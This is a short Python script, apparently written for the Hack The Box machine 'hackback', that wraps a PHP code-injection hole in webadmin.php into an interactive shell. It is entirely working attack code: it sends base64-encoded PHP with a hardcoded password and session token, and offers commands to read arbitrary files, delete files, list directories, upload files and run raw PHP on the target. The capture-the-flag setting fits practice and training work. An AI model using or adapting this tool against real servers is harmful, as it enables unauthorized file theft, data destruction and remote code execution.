#!/usr/bin/python3

import requests
import re
from base64 import b64decode, b64encode
from cmd import Cmd

class Terminal(Cmd):
  prompt = 'INPUT => '

  def __init__(self):
    super().__init__()

  def do_cat(self, args):
    command = f'echo(base64_encode(file_get_contents("{args}")));'
    print(run_php(command))

  def do_del(self, args):
    command = f'unlink("{args}");'
    print(run_php(command))

  def do_upload(self, args):
    source, destination = args.split(' ')

    with open(source, 'r') as handle:
      for line in handle:
        b64_line = b64encode(str.encode(line))
        b64_line = b64_line.decode('utf-8')
        command = f"$fp = fopen('{destination}', 'a');"
        command += f"fwrite($fp, base64_decode('{b64_line}'));"
        print(command)
        run_php(command)

  def do_ls(self, args):
    command = 'foreach (scandir("' + args + '") as $filename) { $x .= $filename."\\n"; }; echo(base64_encode($x));'
    print(run_php(command))
    
  def do_raw(self, args):
    # ToDo:
    ## base64 encode output
    print(run_php(args))

def parse_response(page):
  page = page.decode('utf-8')
  m = re.search('>>>>>_(.*?)_<<<<<', page)
  if m:
    return b64decode(m.group(1)).decode('utf-8')
  else:
    return 1

def run_php(php_code):
  url = 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php'
  params = {
    'action':'show',
    'site':'hackthebox',
    'password':'12345678',
    'session':'b3fe804656da306851529bee0dde9d4571059c0ff89b39a07b9a8695e4d490d2',
    'ippsec': b64encode(str.encode(php_code))
  }
  proxies = {
    'http':'http://localhost:9080',
  }
  r = requests.get(url, params=params, proxies=proxies, allow_redirects=False)
  return parse_response(r.content)

term = Terminal()
term.cmdloop()